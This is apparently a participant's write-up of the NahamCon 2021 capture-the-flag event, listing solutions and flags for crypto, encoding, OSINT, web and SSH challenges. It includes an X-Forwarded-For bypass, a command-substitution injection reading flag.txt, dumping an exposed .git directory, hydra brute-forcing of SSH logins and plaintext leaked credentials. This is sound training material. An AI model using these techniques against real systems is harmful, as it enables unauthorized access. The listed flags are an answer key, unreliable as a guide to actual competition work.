# NAHAMCON CTF
> BLUE COSMO 3/12/2021

## RESOURCES
```
https://ctf.nahamcon.com/user
https://constellations.page/
https://github.com/constellations-git
```

## READ THE RULES
FLAG IN SOURCE
```
flag{90bc54705794a62015369fd8e86e557b}
```

## CAR KEYS
- CIPHER TEXT - ygqa{6y980e0101e8qq361977eqe06508q3rt}
- KEY - QWERTY
- USE 'https://www.boxentriq.com/code-breaking/keyed-caesar-cipher'
```
flag{6f980c0101c8aa361977cac06508a3de}
```

## BUZZ
FILE CONTENT - ��f؄9�Ǧ03f�sCL4�D����2m��a�L�8l���
- COMPRESSED 16 BITS
RUN :
```bash
zcat buzz
flag{b3a33db7ba04c4c9052ea06d9ff17869}
```

## POLLEX
- FLAG ENDS WITH '8fe36bc00}'

## CHICKEN WINGS
- FILE CONTENTS - ♐●♋♑❀♏📁🖮🖲📂♍♏⌛🖰♐🖮📂🖰📂🖰🖰♍📁🗏🖮🖰♌📂♍📁♋🗏♌♎♍🖲♏❝
- USE 'https://lingojam.com/WingdingsTranslator'
```
flag{e0791ce68f718188c0378b1c0a3bdc9e}
```

## ESAB64
FILE CONTENT - mxWYntnZiVjMxEjY0kDOhZWZ4cjYxIGZwQmY2ATMxEzNlFjNl13X
REVERSE BASE64 STRING, DECODE, REVERSE AGAIN
```
flag{fb5211b498afe87b1bd0db601117e16e}
```

## SHOELACES
RUN
```
strings shoelaces.jpg | grep fl
flag{137288e960a3ae9b148e8a7db16a69b0}
```

## EIGHTH CIRCLE
- FILE CONTENT
``` 
D'`r#LK\[}{{EUUTet,r*qo'nmlk5ihVB0S!>w<<)9xqYonsrqj0hPlkdcb(`Hd]#a`_A@VzZY;Qu8NMRQJn1MLKJCg*)ED=a$:?>7[;:981w/4-,P*p(L,%*)"!~}CB"!~}_uzs9wpotsrqj0Qmfkdcba'H^]\[Z~^W?[TSRWPt7MLKo2NMFj-IHG@dD&<;@?>76Z{9276/.R21q/.-&J*j(!E%$d"y?`_{ts9qpon4lTjohg-eMihg`&^cb[!_X@VzZ<RWVOTSLpP2HMFEDhBAFE>=BA:^8=6;:981Uvu-,10/(Lm%*)(!~D1
```
- EIGHT CRICLE = MALEBOLGE
- MALEBOLGE IS A LANGUAGE, RUN IT
- CAN USE - http://www.malbolge.doleczek.pl/
```
flag{bf201f669b8c4adf8b91f09165ec8c5c}
```

## $ECHO
```
`<../flag.txt`
flag{1beadaf44586ea4aba2ea9a00c5b6d91}
```

## HOMEWARD BOUND
```
curl -i -H "X-FORWARDED-FOR: 127.0.0.1" http://challenge.nahamcon.com:31428/
flag{26080a2216e95746ec3e932002b9baa4}
```

## MERCH STORE
VIEW SOURCE
```
flag{fafc10617631126361c693a2a3fce5a7}
```

# THE MISSION
VIEW SOURCE
```
flag{48e117a1464c3202714dc9a350533a59}
```

## BIONIC
PATH: https://constellations.page/robots.txt
```
flag{33b5240485dda77430d3de22996297a1}
```

## MEET THE TEAM
- NAVIGATE TO PATH LOCATED IN 'robots.txt'
```
https://constellations.page/meet-the-team.html
```
USING HINT, VIEW SOURCE TO FIND:
```
<!-- Vela, can we please stop sharing our version control software out on the public internet? -->
```
- VELA IS A CONSTELATION
- GITHUB IS VERSION CONTROL
.git/HEAD
```
e7d4663ac6b436f95684c8bfc428cef0d7731455
```
- GET '.git' WITH  'https://github.com/kost/dvcs-ripper'
- AFTER INSTALLING DEPENDENCIES, RUN:
```
./rip-git.pl -v -u https://constellations.page/.git/
```
CD INTO .GIT DIRECTORY, RUN
```
git show
...
flag{4063962f3a52f923ddb4411c139dd24c}
```

## GUS
- GITHUB - https://github.com/gusrodry
- VIEW GITHUB, '.ssh' DIRECTORY
```
flag{84d5cc7e162895fa0a5834f1efdd0b32}
```

## BANKING ON IT
```
chmod 600 id_rsa
ssh -p 31580 gus@challenge.nahamcon.com -i id_rsa
```

## HERCULES
VIEW GITHUB - https://github.com/HerculesScox
```
#!/bin/bash

IP=$1
PORT=$1

sshpass -p starstruckherc ssh hercules@$IP -p $PORT
#
# This flag can be submitted for the `Hercules` challenges, revealed after you solve `Meet The Team`, visible after you solve `Bionic`
# flag{5bf9da15002d7ea53cb487f31781ce47}
```

## LYRA
- LINKEDIN PAGE - https://www.linkedin.com/in/lyra-patte-a8193b207
- TWITTER - https://twitter.com/LyraPatte
- FROM TWITTER, ACCESS - 'https://constellations.page/constellations-documents/1/'
- RUN DIRB SCAN ON 'https://constellations.page/constellations-documents/' TO FIND:
```
https://constellations.page/constellations-documents/5/
flag{bd869e6193c27308d2fd3ad4b427e8c3}
```

## HYDRAULIC
- USING CREDENTIAL LISTS OBTAINED FROM 'LYRA'
- USE HYDRA TO BURTE MULTIPLE CREDENTIALS
```
hydra -L userlist.lst -P passlist.lst 35.239.227.150 -s PORT -t 4 ssh
[30614][ssh] host: 35.239.227.150   login: pavo   password: starsinthesky
```
SSH WITH NEW CREDENTIALS
```
ssh pavo@challenge.nahamcon.com -p PORT
cat flag.txt
flag{cadbbfd75d2547700221f8c2588e026e}
```

## ORION
TWITTER - https://twitter.com/OrionMorra
- CREDS ON TWITTER
  - USER - orion
  - PASS - stars4love4life
```
flag{0bcffb17cbcbf4359a42ec45d0ccaf2}
```

## INTERNAL
WITH ORIONS CREDS, RUN:
```
sh create_mysql_admin_user.sh
========================================================================
You can now connect to this MySQL Server using:

    mysql -uadmin -pH1SZbWwoG5To -h<host> -P<port>

Please remember to change the above password as soon as possible!
MySQL user 'root' has no password but only allows local connections
========================================================================
```
SOMEWHAT WORKING COMMAND:
```
mysql -u admin -p H1SZbWwoG5To -h internal-4ca98cd867aed7b8-b779764cc-h4lsm -P 30444
```

## DEGRADE
CREDS:
  - USER: hercules
  - PASS: starstruckherc
SSH:
```bash
ssh hercules@challenge.nahamcon.com -p PORT
hercules@degrade-d4ab4804dfe6d613-686866b977-9vxpl:/home/pamela$ cat reminder.txt
hercules@degrade-d4ab4804dfe6d613-686866b977-9vxpl:/home/pamela$ ion and I need to fix it... golly I wish they would call me b
```

## ABYSS
CREDS:
```
# Password is userpass
ssh -p 32140 user@challenge.nahamcon.com
```
LOOK THROUGH OUTPUT
```
flag{db758a0cc25523993416c305ef15f9ad}
```

## #NAHAMCON2021
https://twitter.com/NahamSec/status/1370077327082680321
```
flag{e36bc5a67dd2fe5f33b62123f78fbcef}
```

## VEEBEE
FILE CONTENT
```
'
'
#@~^HAAAAA==~,P~,P,PP,P,~P,P~P,P~~,PP,~PgAMAAA==^#~@
#@~^qgAAAA==v,.nA+PTWdP(E"y,4;".@&B@&v@&t/o~Ga`r?KD.XS~	WOPD4lDPnCkX"Eb@&Hdo~GX`E}3mX~,l1OEmVsXBPzG!BD~DbotD ~qDPb/~Y4CDPnlkzRr#@&\koAGavJWVmLP00Z*l,&9,2f0lcf&6 CTW0!R+0W!!90^8r#hjMAAA==^#~@
```
DECODE USING https://github.com/JohnHammond/vbe-decoder
```
' VeeBee goes buzz buzz
'
'
MsgBox("Sorry, not that easy!")
MsgBox("Okay, actually, you're right. It is that easy.")
MsgBox("flag{f805593d933f5433f2a04f082f400d8c}")
```

## DISCORD
IOT
```
flag{1ff473816ef21857cc62f838e8a33fc7}
```
HTB
```
flag{437f3e5ecdd39a29d695e2e31603f5b4}
```
RED TEAM
```
flag{fd59547d85953cac9dd5f378daed2157}
```
LIVE RECON
```
flag{2795da9d0d2055d259a3fb4d6b78629c}
```
UHC-BR
```
flag{120c45c7b99d8cba1567441f5bef599e}
```
INE
```
flag{e713de181584836c9499811f13cb0e62}
```

## OTHER FLAGS
TWITTER FLAG
```
flag{e483bffafbb0db5eabc121846b455bc7}
```
HTB
```
HTB{4l50_h4ck3r_by_n16h7}
```
